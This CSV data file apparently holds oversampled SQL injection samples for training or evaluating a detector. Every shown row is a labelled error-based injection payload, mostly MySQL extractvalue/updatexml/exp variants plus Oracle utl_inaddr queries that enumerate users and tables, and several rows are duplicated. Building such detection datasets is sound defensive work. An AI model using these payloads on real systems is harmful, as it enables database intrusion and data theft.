id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000020,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",nearest_attack_euclidean,R000066,0.7895862653212328
SMOTE_000021,attack,error,"1',  (  select   (  case when   (  6560  =  2813  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  ",nearest_attack_euclidean,R000045,0.007115060400896074
SMOTE_000022,attack,error,"1""   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  ""dzse""  =  ""dzse",nearest_attack_euclidean,R000083,0.8752951655142849
SMOTE_000023,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (     (  'aqdj'  =  'aqdj",nearest_attack_euclidean,R000209,0.1351084831151757
SMOTE_000024,attack,error,"1%""   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000308,0.972111661339346
SMOTE_000025,attack,error,"1' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and 'esjl'  =  'esjl",nearest_attack_euclidean,R000264,0.12063496629773977
SMOTE_000026,attack,error,"1"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""okpa""  =  ""okpa",nearest_attack_euclidean,R000069,1.094138892246642
SMOTE_000027,attack,error,"1"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""ekjs"" like ""ekjs",nearest_attack_euclidean,R000240,0.993718271034002
SMOTE_000028,attack,error,"1  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  5130  =  5130",nearest_attack_euclidean,R000237,1.1657186896866578
SMOTE_000029,attack,error,"1%"" procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000281,0.9227156680200937
SMOTE_000030,attack,error,"1%"" procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000281,0.23906014480090804
SMOTE_000031,attack,error,"1'  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and   (  'szib' like 'szib",nearest_attack_euclidean,R000072,0.5704768149334724
SMOTE_000032,attack,error,"1   )    )     )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000124,0.7765144755368799
SMOTE_000033,attack,error,"1'   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   'ayqn' like 'ayqn",nearest_attack_euclidean,R000091,0.041340192264351254
SMOTE_000034,attack,error,"1',exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  7759  =  7759,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",nearest_attack_euclidean,R000210,1.061694769545103
SMOTE_000035,attack,error,"1' where 8277  =  8277 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",nearest_attack_euclidean,R000054,0.3339480062156464
SMOTE_000036,attack,error,"1'   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'tblb'  =  'tblb",nearest_attack_euclidean,R000078,0.04171628032321127
SMOTE_000037,attack,error,"1' where 2160  =  2160 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000255,0.8897249394997789
SMOTE_000038,attack,error,"1""  )   as pkkx where 6716  =  6716 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",nearest_attack_euclidean,R000291,0.2511916220939426
SMOTE_000039,attack,error,"1""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""thkh"" like ""thkh",nearest_attack_euclidean,R000102,0.9550198826985011
SMOTE_000040,attack,error,"1'+  (  select pdfv where 1172  =  1172 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   +'",nearest_attack_euclidean,R000309,0.45259268516805207
SMOTE_000041,attack,error,"1'   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  'yznn' like 'yznn",nearest_attack_euclidean,R000213,0.8833185742836971
SMOTE_000042,attack,error,"1'   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'mexd' like 'mexd",nearest_attack_euclidean,R000155,0.2881444776319685
SMOTE_000043,attack,error,"1'||  (  select 'fcws' from dual where 9184  =  9184 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   ||'",nearest_attack_euclidean,R000087,0.8068927484106815
SMOTE_000044,attack,error,"1'+  (  select 'otqy' where 2754  =  2754 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   +'",nearest_attack_euclidean,R000113,0.4189752138104448
SMOTE_000045,attack,error,"1  )   as hlit where 4973  =  4973 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000103,0.5393280844858785
SMOTE_000046,attack,error,"1""  )   as jaxh where 6318  =  6318 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R000093,0.29621790733680453
SMOTE_000047,attack,error,"exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  1049  =  1049,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",nearest_attack_euclidean,R000205,1.1321424966681164
SMOTE_000048,attack,error,"1   )    )    as bgdm where 3473  =  3473 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",nearest_attack_euclidean,R000236,0.6860167189063623
SMOTE_000049,attack,error,"1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz",nearest_attack_euclidean,R000062,0.8253876379905157
SMOTE_000050,attack,error,"1""   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  ""mmsh""  =  ""mmsh",nearest_attack_euclidean,R000035,0.7382107321789932
SMOTE_000051,attack,error,"1'   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  'zpkv'  =  'zpkv",nearest_attack_euclidean,R000159,0.07852423818467129
SMOTE_000052,attack,error,"1'||  (  select 'kbvq' where 9279  =  9279 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )     )  ||'",nearest_attack_euclidean,R000131,1.340053645750956
SMOTE_000053,attack,error,"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037",nearest_attack_euclidean,R000052,0.012524835855986868
SMOTE_000054,attack,error,"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ulep'  =  'ulep",nearest_attack_euclidean,R000021,0.050681208839167054
SMOTE_000055,attack,error,"1%'   )    )    procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000082,0.05667414257585265
SMOTE_000056,attack,error,"1""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""thkh"" like ""thkh",nearest_attack_euclidean,R000102,0.9508199187045349
SMOTE_000057,attack,error,"1%""   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000278,0.11311859211804276
SMOTE_000058,attack,error,"1   )    )    procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000014,1.0851311574737625
SMOTE_000059,attack,error,"1""  )   as pkkx where 6716  =  6716 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",nearest_attack_euclidean,R000291,0.854627329302715
SMOTE_000060,attack,error,"1"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  ",nearest_attack_euclidean,R000059,0.4618076932177987
SMOTE_000061,attack,error,"1"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  ",nearest_attack_euclidean,R000108,0.3789706196076253
SMOTE_000062,attack,error,"1""   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   ""gmld"" like ""gmld",nearest_attack_euclidean,R000043,0.04571524493661383
SMOTE_000063,attack,error,"1'   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'mexd' like 'mexd",nearest_attack_euclidean,R000155,0.015028872959443874
SMOTE_000064,attack,error,"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'kwhs' like 'kwhs",nearest_attack_euclidean,R000011,0.022550607038043777
SMOTE_000065,attack,error,"1   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  9474  =  9474",nearest_attack_euclidean,R000196,0.5338355729437877
SMOTE_000066,attack,error,"1'+  (  select jidy where 2989  =  2989 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000173,0.2556425003886512
SMOTE_000067,attack,error,"1  )   as lfra where 2669  =  2669 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",nearest_attack_euclidean,R000202,0.48152131080259286
SMOTE_000068,attack,error,"1""   )    )    as rcse where 4559  =  4559 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R000016,0.5927339234873558
SMOTE_000069,attack,error,"1"" where 5353  =  5353 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000111,0.7300336223319137
SMOTE_000070,attack,error,"1 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000156,1.8059875903142093
SMOTE_000071,attack,error,"1  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  1185  =  1185",nearest_attack_euclidean,R000286,0.9761243520640575
SMOTE_000072,attack,error,"1 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  -- mwsm",nearest_attack_euclidean,R000172,0.7884198434246513
SMOTE_000073,attack,error,"1'+  (  select 'usoq' where 7783  =  7783 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   +'",nearest_attack_euclidean,R000160,0.9435075394885377
SMOTE_000074,attack,error,"1 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  # fzni",nearest_attack_euclidean,R000026,0.7355034603758195
SMOTE_000075,attack,error,"1  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  ",nearest_attack_euclidean,R000063,0.3703196906900213
SMOTE_000076,attack,error, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  USERNAME   )    )    FROM SYS.ALL_USERS   )    )    AND 'i'  =  'i,nearest_attack_euclidean,R000003,0.9844935094981258
SMOTE_000077,attack,error,"1""  )   as jaxh where 6318  =  6318 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R000093,0.3298648072557409
SMOTE_000078,attack,error,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'dqjq'  =  'dqjq",nearest_attack_euclidean,R000071,0.036954482248979355
SMOTE_000079,attack,error,"1'  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",nearest_attack_euclidean,R000167,0.34490355944684503
SMOTE_000080,attack,error,"1' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  ",nearest_attack_euclidean,R000223,0.5750125893369916
SMOTE_000081,attack,error,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000231,0.2620522389714306
SMOTE_000082,attack,error,"1%""   )    )    procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000287,0.05534417035541079
SMOTE_000083,attack,error,"1   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  9474  =  9474",nearest_attack_euclidean,R000196,0.537536799524001
SMOTE_000084,attack,error,"1%"" and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and ""%""  =  """,nearest_attack_euclidean,R000247,0.8435473607516225
SMOTE_000085,attack,error,"1"" or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and ""pnub""  =  ""pnub",nearest_attack_euclidean,R000127,1.778389171612236
SMOTE_000086,attack,error,"1  )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000097,0.5898261566809446
SMOTE_000087,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  'mevd'  =  'mevd",nearest_attack_euclidean,R000153,0.8145484680476557
SMOTE_000088,attack,error,"exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  1049  =  1049,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",nearest_attack_euclidean,R000205,1.530804746661436
SMOTE_000089,attack,error,"1 where 4968  =  4968 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",nearest_attack_euclidean,R000169,0.479288531384291
SMOTE_000090,attack,error,"1""  )   as wxea where 6394  =  6394 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000068,0.5064213930462995
SMOTE_000091,attack,error,"1 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  -- dtha",nearest_attack_euclidean,R000067,1.8019766877498435
SMOTE_000092,attack,error,"1   )    )    as bgdm where 3473  =  3473 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",nearest_attack_euclidean,R000236,0.45064254096802386
SMOTE_000093,attack,error,"1'  )   where 7887  =  7887 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",nearest_attack_euclidean,R000139,0.46333106202902435
SMOTE_000094,attack,error,"1 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- nqdb",nearest_attack_euclidean,R000238,0.8686810108241186
SMOTE_000095,attack,error,"1  )   where 2473  =  2473 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",nearest_attack_euclidean,R000151,0.45660634536127986
SMOTE_000096,attack,error,"1'+  (  select inyd where 1668  =  1668 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  +'",nearest_attack_euclidean,R000123,0.10968992289004505
SMOTE_000097,attack,error,"1'   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'skdm'  =  'skdm",nearest_attack_euclidean,R000099,0.4741850894962647
SMOTE_000098,attack,error,"1""   )    )    as vdbf where 7969  =  7969 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R000005,0.7883510751469133
SMOTE_000099,attack,error,"1 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000220,1.0900530555029284
SMOTE_000100,attack,error,"1""  )   as wxea where 6394  =  6394 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000068,0.5243934739061472
SMOTE_000101,attack,error,"1""  )   as pkkx where 6716  =  6716 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",nearest_attack_euclidean,R000291,0.6741129688768238
SMOTE_000102,attack,error,"1  )   where 1185  =  1185 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000168,0.629848264865843
SMOTE_000103,attack,error, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  table_name   )    )    FROM sys.all_tables   )    )    AND 'i'  =  'i,nearest_attack_euclidean,R000002,1.1483291889403806
SMOTE_000104,attack,error,"1'  )   as dajk where 1452  =  1452 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000197,0.13798540445332416
SMOTE_000105,attack,error,"1   )    )    or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (   8965  =  8965",nearest_attack_euclidean,R000259,0.9353947528137706
